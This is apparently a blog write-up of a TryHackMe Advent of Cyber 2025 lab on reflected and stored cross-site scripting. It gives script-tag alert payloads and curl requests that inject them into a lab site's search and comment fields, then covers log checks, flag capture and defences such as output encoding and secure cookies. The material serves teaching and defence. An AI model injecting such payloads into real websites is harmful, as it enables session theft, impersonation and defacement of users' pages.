# XSS — Merry XSSMas — Writeup(DAY 11— Advent of Cyber TryHackMe 2025)

> **Author**: Cyb3r-Kr4k3s
> **Published**: Dec 12, 2025

---

![Cyb3r-Kr4k3s](https://miro.medium.com/v2/resize:fill:32:32/1*-L_W0InbhKm7ZKroiHTQeQ.jpeg)

5

Listen

Share

## XSS — Merry XSSMas

Introduction

This writeup is aimed at learners and beginners following the Advent of Cyber event.

Cross‑Site Scripting (XSS) is one of the most common web application vulnerabilities, and in this challenge we’ll see why. From a technical perspective, it occurs when user input isn’t properly validated or escaped, allowing malicious JavaScript to be executed instead of treated as harmless text.

In practice, it often starts with something simple — a comment box or a form field that looks innocent until you realize your input is being reflected back as code. That moment of discovery is both frustrating and exciting: you type a payload, refresh the page, and suddenly you’re impersonating a user or stealing a session.

For learners and the community, this task is a safe way to understand how attackers exploit weak input handling and how defenders can prevent it. We’ll focus on two core types — Reflected XSS and Stored XSS — breaking down how they work, showing examples, and sharing defensive notes so you can practice responsibly and strengthen your skills.

TL;DR

- Goal: identify and exploit Reflected and Stored XSS in a web app.
- Flow: test input fields → inject payloads → confirm reflected execution → persist payloads in stored fields → observe impact.
- Key tools: browser, payloads (), system logs.
- Takeaway: Reflected XSS targets individuals via crafted links; Stored XSS persists on the server and impacts all visitors.

Requirements and tools

- Environment: TryHackMe Advent of Cyber target site.
- Payloads: simple JavaScript alerts (), base64‑encoded payloads for obfuscation.
- Browser: any modern browser with developer tools.
- Ethics: practice only in authorized labs; never attempt on real sites.

### What’s XSS Attack

Cross-site scripting (XSS) is a tactic in which an attacker injects malicious code via one or more web scripts into a legitimate website or web application. When a user loads the website or runs the web application, these scripts execute within the user’s browser. When an application doesn’t properly validate or escape user input, that input can be interpreted as code rather than harmless text. This results in malicious code that can steal credentials, deface pages, or impersonate users. Depending on the result, there are various types of XSS. In today’s task, we focus on Reflected XSS and Stored XSS.

Differentiation from Other XSS Types

- Reflected XSS: In a Reflected XSS attack, the payload is not stored on the backend. It is typically part of the URL (e.g., in a search query parameter). The server simply reflects the script back to the single user who clicked the malicious link in an immediate, non-persistent response. The attacker must trick each victim individually into clicking a specially crafted URL.
- DOM-based XSS: This is a variant where the entire vulnerability and execution happen entirely within the client-side code (in the Document Object Model environment), often without the payload ever being sent to the backend server. Data flow issues within client-side JavaScript cause the vulnerability.

## TASK 2 Leave the Cookies, Take the Payload

### First Question

Which type of XSS attack requires payloads to be persisted on the backend?

Answer: Stored XSS

The Argument for Stored XSS

The type of XSS attack that requires the malicious payloads to be persisted on the backend is Stored XSS (also known as Persistent XSS).

Here is a breakdown of why this is the specific classification and how it differs from other types:

Key Characteristics of Stored XSS

- Persistence on the Server: The fundamental requirement for a Stored XSS attack is that the attacker successfully injects a malicious script that the backend system saves permanently (persists). This usually happens through application inputs like comment fields, user profile sections, forum posts, or message boards. The payload resides in the application’s database, file system, or other data store.
- Server-Side Delivery to Victims: The attack is executed when a legitimate user’s browser requests the specific page that retrieves and displays the stored, malicious content. The backend serves the script as part of the standard HTML response to every user who views that page.
- High Severity and Wide Impact: Because the payload is hosted and distributed by the vulnerable application itself, a single initial injection by the attacker can potentially compromise all subsequent visitors to the affected page, making it a high-impact vulnerability.

### Reflected XSS — Step by step

- Identify input field

- Search bar at http://10.66.xxx.xxx

![image](https://miro.medium.com/v2/resize:fit:700/1*HdoTuUh5WyeyK-oth0Fz1w.png)

2. Inject test payload for Reflected XSS

Payload

```
<script>alert('Reflected Meow Meow')</script>
```

2.1 Option One with Browser

## Get Cyb3r-Kr4k3s’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Input Payload and click on Search Messages

![image](https://miro.medium.com/v2/resize:fit:700/1*5emZ7d1isZcKtRP_7igYiA.png)

2.2 Option Two with Curl Command

```
curl 'http://10.66.149.217/?search=%3Cscript%3Ealert(%27Reflected+Meow+Meow%27)%3C%2Fscript%3E' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i'
```

![image](https://miro.medium.com/v2/resize:fit:700/1*2JYnXz3TVQ3IbuaD9hNF3Q.png)

3 Observe behaviour

- Input is reflected directly in results without encoding.
- Browser interprets HTML/JS as code.
- Alert box appears, confirming execution.

![image](https://miro.medium.com/v2/resize:fit:700/1*SFHyjz1Dt60rOMqaijP5mw.png)

4 Check system logs

- Logs show unusual payloads, confirming detection.

![image](https://miro.medium.com/v2/resize:fit:700/1*1fTk_AmNUiqJXih4rF5pHg.png)

5. Submit the flag

![image](https://miro.medium.com/v2/resize:fit:700/1*a1XdB2Uy7cIQ5KpyPcxsag.png)

![image](https://miro.medium.com/v2/resize:fit:700/1*epTZEkRCJPmDnsCWuYnlAw.png)

Potential Impact: attackers can trick victims into clicking crafted links (phishing), leading to credential theft, impersonation, or data modification.

### Stored XSS — Step by step

1.- Locate persistent input field

- Send message/comment form on http://10.66.xxx.xxx

![image](https://miro.medium.com/v2/resize:fit:700/1*CXPBBVbppqWJd0L4covazA.png)

2.- Submit malicious payload

2.1 Option One with Browser

Input Payload and click on Send Message

![image](https://miro.medium.com/v2/resize:fit:700/1*W9S-Wfpwr_tGjPkK7t7Upg.png)

2.2 Option Two with Curl Command

- The first command with curl will store the payload before running it.

```
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: 10.64.175.144' -H $'Content-Length: 83' -H $'Cache-Control: max-age=0' -H $'Accept-Language: en-GB,en;q=0.9' -H $'Origin: http://10.64.175.144' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Referer: http://10.64.175.144/' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \
    --data-binary $'action=comment&comment=%3Cscript%3Ealert%28%27Stored+Meow+Meow%27%29%3C%2Fscript%3E' \
    $'http://10.64.175.144/'
```

- Now that the payload has been stored in the comment path “comment_success=1”, we can make the request to “comment_success=1” and it will return the run and then the flag.

```
curl 'http://10.66.149.217/?comment_success=1' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://10.66.149.217/' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' | grep "THM"
```

3. Observe persistence

- Payload saved in database.
- Every visitor to the page triggers the script.

![image](https://miro.medium.com/v2/resize:fit:700/1*H5JIABgmwjqgu-1qdbsHWw.png)

4 Check system logs

- Logs show unusual payloads, confirming detection.

![image](https://miro.medium.com/v2/resize:fit:700/1*-szSdrDdJ3jfDvw7YXe35A.png)

5. Submit the flag

![image](https://miro.medium.com/v2/resize:fit:700/1*kViKxrCF29aDXzIZ8moCBQ.png)

![image](https://miro.medium.com/v2/resize:fit:700/1*_G6-b14LTyBYoI3Qo0p2Jg.png)

Potential Impact:

- Steal session cookies.
- Fake login popups.
- Deface the page.

T
he TryHackMe AoC 2025 CTF is a great opportunity to test your skills and knowledge. If you are interested in participating, you can access it via the following link:

## Advent of Cyber 2025: Free 24-Day Cyber Security Challenge

### Join Advent of Cyber 2025 by TryHackMe. 24 beginner-friendly cyber security challenges, starting December 1st, with…

tryhackme.com

### Defensive measures

- Disable dangerous rendering paths: avoid innerHTML; use textContent to treat input as text.
- Secure cookies: set HttpOnly, Secure, and SameSite attributes.
- Sanitize and encode input/output: escape scripts, event handlers, and JavaScript URLs while allowing safe formatting.
- Monitor logs: detect unusual payloads and alert on suspicious activity.

### Links References

https://www.cloudflare.com/en-gb/learning/security/how-to-prevent-xss-attacks/

## Cross Site Scripting Prevention - OWASP Cheat Sheet Series

### Website with the collection of all the cheat sheets of the project.

cheatsheetseries.owasp.org

## DOM based XSS Prevention - OWASP Cheat Sheet Series

### Website with the collection of all the cheat sheets of the project.

cheatsheetseries.owasp.org

### Conclusion and next steps

Key lesson: XSS doesn’t break cryptography; it exploits the improper handling of untrusted data. Reflected XSS is immediate and user-specific, while Persistent (Stored) XSS is persistent and affects all visitors. Defenders can mitigate these attacks through strict input validation, context-aware output encoding, and the implementation of secure cookie policies and Content Security Policy (CSP).

### Next steps:

- Practice with more advanced payloads using XSS cheat sheets.
- Explore DOM‑based XSS variants.
- Build a checklist of secure coding practices for web apps.

### Links References on TryHackMe

## XSS

### Explore in-depth the different types of XSS and their root causes.

tryhackme.com

## Advanced Client-Side Attacks

### Through real-world scenarios, you will gain a detailed understanding of client-side attacks, including XSS, CSRF…

tryhackme.com



---
*Original URL: [https://medium.com/bugbountywriteup/xss-merry-xssmas-writeup-day-11-advent-of-cyber-tryhackme-2025-5a1b014dc23d?source=search_post---------123-----------------------------------](https://medium.com/bugbountywriteup/xss-merry-xssmas-writeup-day-11-advent-of-cyber-tryhackme-2025-5a1b014dc23d?source=search_post---------123-----------------------------------)*
